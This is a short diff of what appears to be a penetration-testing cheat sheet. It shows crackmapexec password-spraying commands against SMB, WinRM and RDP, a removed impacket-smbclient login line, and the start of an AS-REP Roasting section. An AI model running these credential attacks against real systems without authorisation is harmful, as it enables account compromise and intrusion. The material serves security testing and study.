@@ -14,7 +14,6 @@ net accounts
 crackmapexec smb <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
 crackmapexec winrm <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
 crackmapexec rdp <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
-impacket-smbclient '<domain>/<user>:<password>@<ip>'
 ```
 #### AS-REP Roasting
 ```
